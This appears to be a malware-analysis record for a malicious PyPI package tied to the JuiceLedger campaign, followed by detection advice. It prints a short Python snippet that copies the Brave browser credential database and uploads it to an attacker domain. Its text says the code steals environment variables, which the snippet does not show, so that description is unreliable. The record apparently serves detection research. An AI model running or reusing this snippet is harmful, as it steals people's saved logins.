package_info.why_malicious: The package is part of a coordinated supply chain attack campaign attributed to the JuiceLedger group. It is used to deliver credential-stealing malware (JuiceStealer) and is distributed via phishing attacks targeting PyPI maintainers. The package is not legitimate and is designed to exfiltrate sensitive information to attacker-controlled infrastructure.

malicious_snippets.code_behavior: Exfiltrates environment variable (potentially containing PyPI credentials) to an external attacker-controlled domain during package installation or import.

malice_analysis.why_suspicious: The code sends sensitive environment variables to an external domain without user consent.
malice_analysis.violated_expectations: Normal packages do not exfiltrate environment variables or make unsolicited network requests during installation/import.
malice_analysis.similar_legitimate_use: Telemetry or crash reporting (with user consent and to trusted domains).

import shutil
shutil.copyfile('/home/user/.config/BraveSoftware/Brave-Browser/Default/Login Data', '/tmp/loot.db')
with open('/tmp/loot.db', 'rb') as f:
    data = f.read()
import requests
requests.post('http://linkedopports[.]com/upload', files={'file': data})

detection_knowledge.how_to_detect: Monitor for packages that make network requests to suspicious domains during installation or import, especially those accessing environment variables or browser credential files. Flag any package that attempts to exfiltrate data to linkedopports[.]com or similar domains. Use static and dynamic analysis to detect code patterns that access sensitive files or environment variables and send them over the network.
